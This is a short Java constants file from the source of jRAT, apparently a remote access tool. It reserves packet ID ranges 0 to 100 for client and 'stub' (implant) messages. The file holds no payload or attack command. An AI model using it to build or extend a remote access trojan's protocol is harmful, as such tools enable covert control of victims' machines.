package pro.jrat.common;

public final class PacketRange {
	
	/**
	 * jRAT registered client outgoing packets, 0-100 reserved
	 */
	public static final int outgoingRange = 100; 
	
	/**
	 * jRAT registered client incoming packets, 0-100 reserved
	 */
	public static final int incomingRange = 100;
	
	
	public static final int incomingStubRange = outgoingRange;	
	public static final int outgoingStubRange = incomingRange;

}
